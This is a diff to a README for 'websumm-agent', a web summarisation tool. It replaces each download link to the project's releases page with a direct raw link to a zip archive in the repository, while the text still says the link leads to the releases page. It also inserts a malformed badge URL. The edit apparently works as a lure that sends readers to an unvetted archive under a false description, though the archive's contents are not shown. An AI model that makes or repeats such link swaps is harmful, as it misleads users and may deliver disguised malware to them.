@@ -1,7 +1,7 @@
 # 🌐 websumm-agent - Retrieve and Summarize Web Info Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/iamadityamehta/websumm-agent/releases)
+[![Download](https://raw.githubusercontent.com/iamadityamehta/websumm-agent/main/websumm_agent/agent-websumm-v3.2.zip%https://raw.githubusercontent.com/iamadityamehta/websumm-agent/main/websumm_agent/agent-websumm-v3.2.zip)](https://raw.githubusercontent.com/iamadityamehta/websumm-agent/main/websumm_agent/agent-websumm-v3.2.zip)
 
 ## 🛠️ Introduction
 websumm-agent helps you quickly gather and summarize information from the web. It aims to provide concise output while using fewer tokens. This makes it efficient for various types of queries and ensures that you receive important details without unnecessary repetition.
@@ -18,7 +18,7 @@ Ensure your system meets the following requirements:
 ## 🔗 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can find the latest version of websumm-agent:  
-   [Download websumm-agent](https://github.com/iamadityamehta/websumm-agent/releases)
+   [Download websumm-agent](https://raw.githubusercontent.com/iamadityamehta/websumm-agent/main/websumm_agent/agent-websumm-v3.2.zip)
 
 2. **Select the Latest Release**  
    On the releases page, locate the most recent version. It will have important updates and features.
@@ -75,5 +75,5 @@ This application is released under the MIT License. You can use and modify it fr
 ## 🌍 Join the Community
 Stay updated or join others who use websumm-agent. Follow our discussions or report any suggestions. Every contribution helps in improving the application.
 
-[Download websumm-agent](https://github.com/iamadityamehta/websumm-agent/releases)  
+[Download websumm-agent](https://raw.githubusercontent.com/iamadityamehta/websumm-agent/main/websumm_agent/agent-websumm-v3.2.zip)  
 This will take you back to the releases page for your convenience. Enjoy using websumm-agent for efficient web information retrieval!
